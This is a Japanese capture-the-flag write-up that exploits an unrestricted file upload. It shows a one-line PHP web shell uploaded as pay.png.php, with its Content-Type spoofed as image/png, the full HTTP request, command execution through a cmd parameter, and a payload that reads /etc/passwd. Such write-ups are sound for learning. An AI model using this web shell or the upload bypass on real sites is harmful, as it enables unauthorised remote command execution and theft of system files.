# Challenge Name: Trojan Horse
***
画像ファイルをアップロードできるサイト
![aa](https://github.com/xn16h7/CTF/blob/master/img/writeup6.png)

バックドアシェルをアップロードしてみる
色々試した結果ファイル名とContent-Typeを書き換えるとbypassが可能だった
ファイルの中身を見ているときはファイルの先頭に拡張子にあわせて今回だと臼NGとかを入れることでbypassできる可能性があるらしい

ファイル名をとペイロードを下記のようにしてみた。  
queryにcmdパラメータを入れてコマンド実行できる

> pay.png.php
~~~
<?
system($_GET['cmd']);
?>
~~~

Content-Type: application/octet-stream  
⇒Content-Type: image/pngに変更してリクエストを送信することでbypassができる


~~~
POST /trojan/ HTTP/1.1
Host: 18.194.166.81
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: ja,en-US;q=0.7,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------250722975826467346882742916592
Content-Length: 650
Origin: http://18.194.166.81
Connection: close
Referer: http://18.194.166.81/trojan/
Upgrade-Insecure-Requests: 1

-----------------------------250722975826467346882742916592
Content-Disposition: form-data; name="name"


-----------------------------250722975826467346882742916592
Content-Disposition: form-data; name="email"


-----------------------------250722975826467346882742916592
Content-Disposition: form-data; name="image"; filename="pay.png.php"
Content-Type: image/png

<?
system($_GET['cmd']);
?>
-----------------------------250722975826467346882742916592
Content-Disposition: form-data; name="submit"

Submit
-----------------------------250722975826467346882742916592--
~~~

アップロードに成功した。
![aa](https://github.com/xn16h7/CTF/blob/master/img/%E2%91%A1writeup6.png)


下記のようにクエリにしてOSコマンドを実行してみるとlsコマンドが実行できた。
18.194.166.81/trojan/uploads/b804e095f705962280b4b4102d58c3d6.php?cmd=ls
![aa](https://github.com/xn16h7/CTF/blob/master/img/%E2%91%A2writeup6.png)

flagがなかったので
問題文でパスワードがプレーンtextって書いてあったので下記payloadを送ってPHPを実行する。
~~~
<?php
    system("cat /etc/passwd");
?>
~~~
### SBCTF{unr3s7r1c73d_f1l3_upl04d_1s_d4ng3r0us}

